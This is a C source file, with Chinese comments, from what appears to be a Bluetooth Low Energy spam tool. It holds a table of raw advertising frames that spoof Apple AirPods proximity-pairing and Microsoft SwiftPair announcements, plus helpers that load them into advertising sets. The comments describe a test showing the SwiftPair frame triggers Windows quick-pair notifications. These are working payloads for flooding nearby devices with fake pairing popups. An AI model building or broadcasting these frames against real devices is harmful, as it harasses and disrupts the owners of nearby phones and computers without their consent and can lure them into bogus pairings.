// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 XDUPWW

// 弹窗模板表。字节是协议数据，不是"随手编的随机数"：每一条都要能对着公开的
// 厂商协议资料逐字段讲清楚，否则不允许进表。
//
// 现状只有 Apple 邻近配对（Continuity type 0x07）这一条参考帧。它把 31 字节
// legacy 广播正好占满，结构自洽（AD 长度 0x1E = 1 类型 + 2 公司 ID + 27 数据）。
// 但本仓库没有 iOS 实测，标记 UNVERIFIED：型号字节、iOS 版本、限流行为都要在
// 台架上按 payload 实验矩阵逐条核对。新平台（Samsung / Fast Pair / SwiftPair）
// 的字节在核对通过前不进表，先用 blespam.start raw=<AD hex> 直接喂。

#include "ble_frame/payload.h"

#include <string.h>

// Apple 邻近配对：类型 0x07，长度 0x19，后面 25 字节型号与状态。
// 尾巴上的 0 是保留字段，厂商侧会忽略。
static const uint8_t kAppleAirpods[] = {
    0x07, 0x19, 0x01, 0x20, 0x02, 0x0C, 0x0E, 0x0A, 0x0C, 0x0E, 0x0A,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00,
};

// Microsoft SwiftPair：公司 ID 0x0006，数据以 03 03 开头，后面留空。
// 2026-11-28 在本机 Windows 11 25H2（build 26200）实测：连续发送 10 秒后，
// 通知库里的 Windows.SystemToast.BthQuickPair LastNotificationAddedTime 前进；
// 同长度的 Apple 载荷对照组不动。能触发哪一条 toast 取决于 Windows 版本和
// 通知开关，这里只证明"这条帧会被 SwiftPair 通道接住"。
static const uint8_t kMicrosoftSwiftPair[] = {
    0x03, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const bf_payload_t kPayloads[] = {
    {
        .name = "apple_airpods",
        .platform = BF_PLAT_APPLE,
        .company_id = 0x004C,
        .service_uuid = 0,
        .body = kAppleAirpods,
        .body_len = sizeof(kAppleAirpods),
        .scan_rsp = false,
        .connectable = true,
    },
    {
        .name = "microsoft_swiftpair",
        .platform = BF_PLAT_MICROSOFT,
        .company_id = 0x0006,
        .service_uuid = 0,
        .body = kMicrosoftSwiftPair,
        .body_len = sizeof(kMicrosoftSwiftPair),
        .scan_rsp = false,
        .connectable = true,
    },
};

size_t bf_payload_count(void) {
    return sizeof(kPayloads) / sizeof(kPayloads[0]);
}

const bf_payload_t *bf_payload_at(size_t index) {
    return (index < bf_payload_count()) ? &kPayloads[index] : NULL;
}

const bf_payload_t *bf_payload_find(const char *name) {
    if (name == NULL || name[0] == 0) {
        return NULL;
    }
    for (size_t i = 0; i < bf_payload_count(); i++) {
        if (strcmp(kPayloads[i].name, name) == 0) {
            return &kPayloads[i];
        }
    }
    return NULL;
}

const char *bf_platform_name(bf_platform_t platform) {
    switch (platform) {
        case BF_PLAT_APPLE:
            return "apple";
        case BF_PLAT_SAMSUNG:
            return "samsung";
        case BF_PLAT_GOOGLE:
            return "google";
        case BF_PLAT_MICROSOFT:
            return "microsoft";
        default:
            return "other";
    }
}

bool bf_payload_render(const bf_payload_t *tpl, bf_adv_t *set) {
    if (tpl == NULL || set == NULL || tpl->body == NULL || tpl->body_len == 0) {
        return false;
    }
    if (tpl->service_uuid != 0) {
        return bf_adv_service_data16(set, tpl->service_uuid, tpl->body, tpl->body_len);
    }
    if (tpl->company_id == 0) {
        return false;
    }
    return bf_adv_mfr(set, tpl->company_id, tpl->body, tpl->body_len);
}
